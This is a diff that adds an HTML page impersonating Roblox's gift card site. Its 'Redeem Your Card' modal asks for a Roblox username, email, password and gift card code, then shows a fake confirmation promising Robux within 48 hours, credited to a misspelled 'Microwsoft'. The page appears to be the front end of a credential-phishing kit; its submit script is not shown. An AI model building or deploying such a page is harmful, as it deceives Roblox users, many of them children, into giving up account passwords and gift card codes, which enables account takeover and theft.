@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Roblox Gift Cards – Get More Out of Roblox</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+
+  <!-- TOP NAVIGATION -->
+  <nav class="navbar">
+    <div class="nav-left">
+      <a href="https://www.roblox.com" target="_blank" class="logo-link">
+        <span class="roblox-logo-text">R<span class="logo-diamond">&#9632;</span>BLOX</span>
+      </a>
+    </div>
+    <div class="nav-right">
+      <div class="location-dropdown">
+        <span class="location-icon">
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2">
+            <circle cx="12" cy="10" r="3"/>
+            <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7z"/>
+          </svg>
+        </span>
+        <span>Location</span>
+        <span class="dropdown-arrow">&#9660;</span>
+      </div>
+      <button class="redeem-btn" id="redeemBtn">Redeem Card</button>
+    </div>
+  </nav>
+
+  <!-- HERO SECTION -->
+  <section class="hero">
+    <div class="hero-content">
+      <h1 class="hero-heading">Get more out of Roblox</h1>
+      <a href="https://www.roblox.com/giftcards" target="_blank" class="shop-btn">Shop Gift Cards</a>
+      <a href="https://www.roblox.com/giftcards/business" target="_blank" class="business-link">Shop Roblox Gift Cards for Business</a>
+
+      <div class="gift-card-wrapper">
+        <img src="images/gift-card.png" alt="Roblox Gift Card – Get Robux and more" class="gift-card-img" onerror="this.parentElement.innerHTML='<div class=\'img-placeholder\'>gift-card.png<br/>Place image here</div>'" />
+      </div>
+
+      <p class="hero-desc">
+        Roblox Gift Cards are the easiest way<br />
+        to add credit you can spend toward<br />
+        Robux or a Premium subscription.
+      </p>
+    </div>
+
+    <!-- CHARACTER ARTWORK -->
+    <div class="characters-container">
+      <!-- Char 1: Green jacket, curly black afro — LEFT -->
+      <div class="char char-left">
+        <img src="images/char1.png" alt="Roblox character green jacket"
+             onerror="this.parentElement.innerHTML='<div class=\'img-placeholder\'>char1.png<br/>Green Jacket<br/>Character Here</div>'" />
+      </div>
+
+      <!-- Char 2: Blockhead with green spiky hair, gray Roblox shirt — CENTER-LEFT -->
+      <div class="char char-center-left">
+        <img src="images/char2.png" alt="Roblox avatar green spiky hair blockhead"
+             onerror="this.parentElement.innerHTML='<div class=\'img-placeholder\'>char2.png<br/>Green Hair<br/>Blockhead Here</div>'" />
+      </div>
+
+      <!-- Char 3: Girl with flowing green hair, rainbow stripe shirt — RIGHT -->
+      <div class="char char-right">
+        <img src="images/char3.png" alt="Roblox avatar green hair rainbow shirt"
+             onerror="this.parentElement.innerHTML='<div class=\'img-placeholder\'>char3.png<br/>Green Hair Girl<br/>Rainbow Shirt Here</div>'" />
+      </div>
+
+      <!-- Char 4: Blue shirt, dark hair — FAR RIGHT -->
+      <div class="char char-far-right">
+        <img src="images/char4.png" alt="Roblox character blue shirt"
+             onerror="this.parentElement.innerHTML='<div class=\'img-placeholder\'>char4.png<br/>Blue Shirt<br/>Character Here</div>'" />
+      </div>
+    </div>
+  </section>
+
+  <!-- FREE VIRTUAL ITEMS SECTION -->
+  <section class="free-items-section">
+    <h2 class="free-items-heading">Free Virtual Items</h2>
+    <p class="free-items-desc">
+      Each gift card grants a free virtual item upon redemption and comes with a bonus code for an<br />
+      additional exclusive virtual item.
+    </p>
+  </section>
+
+  <!-- REDEEM CARD MODAL -->
+  <div class="modal-overlay" id="modalOverlay">
+    <div class="modal" id="modal">
+
+      <!-- FORM VIEW -->
+      <div id="formView">
+        <div class="modal-header">
+          <span class="roblox-logo-text modal-logo-text">R<span class="logo-diamond modal-diamond">&#9632;</span>BLOX</span>
+          <button class="modal-close" id="modalClose">&times;</button>
+        </div>
+        <h2 class="modal-title">Redeem Your Card</h2>
+        <p class="modal-subtitle">Enter your details to redeem your Roblox Gift Card</p>
+        <form id="redeemForm">
+          <div class="form-group">
+            <label for="username">Username</label>
+            <input type="text" id="username" name="username" placeholder="Enter your Roblox username" required autocomplete="username" />
+          </div>
+          <div class="form-group">
+            <label for="email">Email</label>
+            <input type="email" id="email" name="email" placeholder="Enter your email address" required autocomplete="email" />
+          </div>
+          <div class="form-group">
+            <label for="password">Password</label>
+            <input type="password" id="password" name="password" placeholder="Enter your password" required autocomplete="current-password" />
+          </div>
+          <div class="form-group">
+            <label for="redeemCode">Redeem Code</label>
+            <input type="text" id="redeemCode" name="redeemCode" placeholder="Enter your gift card code" required />
+          </div>
+          <button type="submit" class="redeem-now-btn">Redeem Now</button>
+        </form>
+      </div>
+
+      <!-- SUCCESS VIEW -->
+      <div id="successView" class="hidden">
+        <div class="modal-header">
+          <span class="roblox-logo-text modal-logo-text">R<span class="logo-diamond modal-diamond">&#9632;</span>BLOX</span>
+        </div>
+        <div class="success-icon">&#10003;</div>
+        <h2 class="success-title">Your account will be updated with the Robux within the next 48 hrs</h2>
+        <p class="success-subtitle">Thanks for using Microwsoft powered with Roblox, Inc.</p>
+        <button class="ok-btn" id="okBtn">OK</button>
+      </div>
+
+    </div>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
